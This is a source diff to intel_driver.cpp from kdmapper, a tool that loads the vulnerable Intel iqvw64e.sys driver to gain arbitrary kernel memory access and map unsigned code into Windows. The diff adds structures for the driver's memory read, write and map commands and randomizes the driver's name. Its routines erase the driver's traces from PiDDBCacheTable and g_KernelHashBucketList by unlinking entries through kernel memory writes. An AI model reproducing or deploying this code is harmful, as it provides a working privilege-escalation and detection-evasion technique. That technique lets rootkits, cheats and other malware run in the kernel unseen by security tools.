@@ -1,15 +1,86 @@
 #include "intel_driver.hpp"
+#include <Windows.h>
+#include <string>
+#include <fstream>
+
+#include "utils.hpp"
+#include "intel_driver_resource.hpp"
+#include "service.hpp"
+#include "nt.hpp"
 
 #ifdef PDB_OFFSETS
 #include "KDSymbolsHandler.h"
 #endif
 
+/**
+ Command structures
+*/
+typedef struct _COPY_MEMORY_BUFFER_INFO
+{
+	uint64_t case_number;
+	uint64_t reserved;
+	uint64_t source;
+	uint64_t destination;
+	uint64_t length;
+}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;
+
+typedef struct _FILL_MEMORY_BUFFER_INFO
+{
+	uint64_t case_number;
+	uint64_t reserved1;
+	uint32_t value;
+	uint32_t reserved2;
+	uint64_t destination;
+	uint64_t length;
+}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;
+
+typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
+{
+	uint64_t case_number;
+	uint64_t reserved;
+	uint64_t return_physical_address;
+	uint64_t address_to_translate;
+}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;
+
+typedef struct _MAP_IO_SPACE_BUFFER_INFO
+{
+	uint64_t case_number;
+	uint64_t reserved;
+	uint64_t return_value;
+	uint64_t return_virtual_address;
+	uint64_t physical_address_to_map;
+	uint32_t size;
+}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;
+
+typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
+{
+	uint64_t case_number;
+	uint64_t reserved1;
+	uint64_t reserved2;
+	uint64_t virt_address;
+	uint64_t reserved3;
+	uint32_t number_of_bytes;
+}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;
+
+// End Command structures
+
 ULONG64 intel_driver::ntoskrnlAddr = 0;
-char intel_driver::driver_name[100] = {};
+std::string cachedDriverName = "";
 
 std::wstring intel_driver::GetDriverNameW() {
-	std::string t(intel_driver::driver_name);
-	std::wstring name(t.begin(), t.end());
+	if (cachedDriverName.empty()) {
+		//Create a random name
+		char buffer[100]{};
+		static const char alphanum[] =
+			"abcdefghijklmnopqrstuvwxyz"
+			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+		int len = rand() % 20 + 10;
+		for (int i = 0; i < len; ++i)
+			buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+		cachedDriverName = buffer;
+	}
+
+	std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
 	return name;
 }
 
@@ -39,11 +110,9 @@ bool intel_driver::AcquireDebugPrivilege() {
 		return false;
 	}
 
-	auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
-
 	ULONG SE_DEBUG_PRIVILEGE = 20UL;
 	BOOLEAN SeDebugWasEnabled;
-	NTSTATUS Status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
+	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
 	if (!NT_SUCCESS(Status)) {
 		Log("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
 		return false;
@@ -58,17 +127,11 @@ HANDLE intel_driver::Load() {
 	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
 	if (intel_driver::IsRunning()) {
 		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
+		Log(L"[-] This means that there is a intel driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver." << std::endl);
+		Log(L"[-] If you are sure that there is no other instance of kdmapper running, you can try to restart your computer to fix this issue." << std::endl);
+		Log(L"[-] If the problem persists, you can try to unload the intel driver manually (If the driver was loaded with kdmapper will have a random name and will be located in %temp%), if not, the driver name is iqvw64e.sys." << std::endl);
 		return INVALID_HANDLE_VALUE;
 	}
-
-	//Randomize name for log in registry keys, usn jornal and other shits
-	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
-	static const char alphanum[] =
-		"abcdefghijklmnopqrstuvwxyz"
-		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-	int len = rand() % 20 + 10;
-	for (int i = 0; i < len; ++i)
-		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
 
 	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);
 
@@ -91,7 +154,7 @@ HANDLE intel_driver::Load() {
 		return INVALID_HANDLE_VALUE;
 	}
 
-	if (!service::RegisterAndStart(driver_path)) {
+	if (!service::RegisterAndStart(driver_path, GetDriverNameW())) {
 		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
 		_wremove(driver_path.c_str());
 		return INVALID_HANDLE_VALUE;
@@ -824,7 +887,7 @@ BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOI
 	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
 }
 
-PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
+PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
 	if (!Table)
 		return nullptr;
 
@@ -844,28 +907,28 @@ PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_A
 }
 
 
-intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
+nt::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
 	
-	PiDDBCacheEntry localentry{};
+	nt::PiDDBCacheEntry localentry{};
 	localentry.TimeDateStamp = timestamp;
 	localentry.DriverName.Buffer = (PWSTR)name;
 	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
 	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
 
-	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
+	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
 }
 
 bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
 
 #ifdef PDB_OFFSETS
-	DWORD PiDDBLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBLock");
+	auto PiDDBLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBLock");
 	if (!PiDDBLockOffset)
 	{
 		Log(L"[-] Warning PiDDBLock not found" << std::endl);
 		return false;
 	}
 
-	DWORD PiDDBCacheTableOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBCacheTable");
+	auto PiDDBCacheTableOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBCacheTable");
 	if (!PiDDBLockOffset)
 	{
 		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
@@ -873,7 +936,7 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 	}
 
 	PVOID PiDDBLock = (PVOID)(intel_driver::ntoskrnlAddr + PiDDBLockOffset);
-	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)(intel_driver::ntoskrnlAddr + PiDDBCacheTableOffset);
+	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)(intel_driver::ntoskrnlAddr + PiDDBCacheTableOffset);
 #else
 	auto PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
 	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D
@@ -916,7 +979,7 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);
 
 	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
-	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);
+	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);
 #endif
 	//context part is not used by lookup, lock or delete why we should use it?
 
@@ -929,7 +992,7 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 	auto n = GetDriverNameW();
 
 	// search our entry in the table
-	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
+	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
 	if (pFoundEntry == nullptr) {
 		Log(L"[-] Not found in cache" << std::endl);
 		ExReleaseResourceLite(device_handle, PiDDBLock);
@@ -938,13 +1001,13 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 
 	// first, unlink from the list
 	PLIST_ENTRY prev;
-	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
+	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't get prev entry" << std::endl);
 		ExReleaseResourceLite(device_handle, PiDDBLock);
 		return false;
 	}
 	PLIST_ENTRY next;
-	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
+	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't get next entry" << std::endl);
 		ExReleaseResourceLite(device_handle, PiDDBLock);
 		return false;
@@ -972,10 +1035,10 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 
 	//Decrement delete count
 	ULONG cacheDeleteCount = 0;
-	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
+	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
 	if (cacheDeleteCount > 0) {
 		cacheDeleteCount--;
-		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
+		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
 	}
 
 	// release the ddb resource lock
@@ -1046,14 +1109,14 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 
 	//Thanks @KDIo3 and @Swiftik from UnknownCheats
 #ifdef PDB_OFFSETS
-	DWORD g_KernelHashBucketListOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"g_KernelHashBucketList");
+	auto g_KernelHashBucketListOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"g_KernelHashBucketList");
 	if (!g_KernelHashBucketListOffset)
 	{
 		Log(L"[-] Can't Find g_KernelHashBucketList Offset" << std::endl);
 		return false;
 	}
 
-	DWORD g_HashCacheLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"g_HashCacheLock");
+	auto g_HashCacheLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"g_HashCacheLock");
 	if (!g_KernelHashBucketListOffset)
 	{
 		Log(L"[-] Can't Find g_HashCacheLock Offset" << std::endl);
@@ -1090,8 +1153,8 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 	}
 	Log(L"[+] g_HashCacheLock Locked" << std::endl);
 
-	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
-	HashBucketEntry* entry = 0;
+	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
+	nt::HashBucketEntry* entry = 0;
 	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
 		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
 		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
@@ -1114,7 +1177,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 	while (entry) {
 
 		USHORT wsNameLen = 0;
-		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
+		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
 			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
 			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
 				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
@@ -1124,7 +1187,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 
 		if (expected_len == wsNameLen) {
 			wchar_t* wsNamePtr = 0;
-			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
+			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
 				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
 				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
@@ -1144,7 +1207,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 			size_t find_result = std::wstring(wsName.get()).find(wdname);
 			if (find_result != std::wstring::npos) {
 				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
-				HashBucketEntry* Next = 0;
+				nt::HashBucketEntry* Next = 0;
 				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
 					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
 					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
